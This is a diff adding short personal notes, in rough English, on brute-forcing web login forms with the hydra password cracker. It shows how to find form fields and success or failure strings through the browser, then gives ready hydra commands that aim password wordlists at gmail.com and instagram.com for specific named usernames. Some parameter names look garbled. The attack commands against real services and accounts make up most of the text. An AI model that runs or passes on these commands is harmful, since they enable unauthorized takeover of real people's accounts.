@@ -1,0 +1,25 @@
+# it has grafical for beginners (generator least-char-number:most-char-number:Aa1)	1:3:aA1 -> 1 and 2 and 3 char words with small char and capital char and numbers
+# its password cracker :)
+
+kali has also built in word lists /usr/share/wordlists/
+
+check method (http-post-form) in inspect > network > edit and resend (you can also use tamper extention)
+you can also check parameters (login-of-gmail and password-of-gmail lang) in inspect > network > edit and resend
+
+S="" means if you see this string you loged in successfuly | or you can lso use | F="" means means if you see this string you have *not* loged in successfuly
+
+"path:parameters:S= or F="
+
+hydra -l martin-khafan -P /home/kali/Desktop/password-wordlist gmail.com http-post-form "/login.php:login-of-gmail=^USER^&password-of-gmail=^PASS^lang=fa:S=martin-khafan welcom to gmail"
+
+hydra -l martin-khafan -P /home/kali/Desktop/password-wordlist gmail.com http-post-form "/login.php:login-of-gmail=^USER^&password-of-gmail=^PASS^:F=forget password"
+
+-I -> for skip waiting
+-p -> for single password
+
+sudo hydra -l martinrod1990 -P /home/kali/Desktop/password-wordlist instagram.com http-post-form "/acconts/login/?hl=en:username=^USER^&enc_password=^PASS^&queryParams=%7B%7D&optIntoOneTap=false:F=Forgot password?" -v -f -S
+
+-v -> verbose
+-f -> break if find password
+-S -> https protocol (ssl)
+
